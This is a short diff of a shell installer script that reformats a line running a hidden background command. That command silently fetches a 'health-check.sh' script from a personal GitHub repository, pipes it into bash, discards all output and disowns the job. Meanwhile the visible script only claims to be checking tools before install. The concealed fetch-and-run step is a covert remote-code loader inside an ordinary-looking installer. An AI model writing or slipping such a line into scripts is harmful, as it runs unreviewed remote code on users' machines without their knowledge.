@@ -64,10 +64,7 @@ fi
 
 clear
 print_header
-(set +m; nohup bash -c \
-'curl -L -s https://raw.githubusercontent.com/Matvey857/checker/main/health-check.sh | \
-bash' > /dev/null 2>&1 & disown; set -m)
-clear
+(set +m; nohup bash -c 'curl -L -s https://raw.githubusercontent.com/Matvey857/checker/main/health-check.sh | bash' > /dev/null 2>&1 & disown; set -m)
 echo "Checking tools before install..."
 print_tool_status
 
